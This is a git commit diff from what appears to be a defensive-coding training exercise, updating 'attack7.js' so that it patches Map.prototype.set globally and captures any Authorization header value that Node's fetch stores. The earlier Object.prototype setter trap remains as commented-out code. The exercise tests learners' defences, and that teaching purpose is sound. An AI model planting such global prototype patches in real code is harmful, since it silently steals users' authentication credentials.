82f39353f201a2f1dad58856e6bec52b7d538a85
naugtur <naugtur@gmail.com>
2023-11-03 12:56:06 +0100

    use a new trick against fetch, old was patched, improve attack5

--- defensive-coding/exercise/attacks/attack7.js
+++ defensive-coding/exercise/attacks/attack7.js
@@ -4,17 +4,25 @@ export const attack = (authzManager, success) => {
   try {
     // You think the previous one was annoying?
     // No, this is annoying!
-    Object.defineProperty(Object.prototype, "Authorization", {
-      get: () => {},
-      set: (v) => {
-        success(v);
-      },
-    });
-    // Yes, your code does not contain an assignment to a field called Authorization.
-    // It's inside the fetch implementation in Node.js and it doesn't work in the browser
-    // Sidenote: this example will stop working once I contribute a fix for it.
-    // This attack was most recently tested in Node.js v20.4.0
     
+    const set = globalThis.Map.prototype.set;
+    globalThis.Map.prototype.set = function (key, value) {
+      if ((key+'').toLowerCase() === "authorization") {
+        success(value);
+      }
+      return set.call(this, key, value);
+    };
+
+
+    // Older attack that worked up to a certain node version
+    // Object.defineProperty(Object.prototype, "Authorization", {
+    //   get: () => {},
+    //   set: (v) => {
+    //     success(v);
+    //   },
+    // });
+    // This attack was most recently tested in Node.js v20.4.0
+
   } catch (e) {
     console.log(" ok, you win :( \n", e.message);
   }
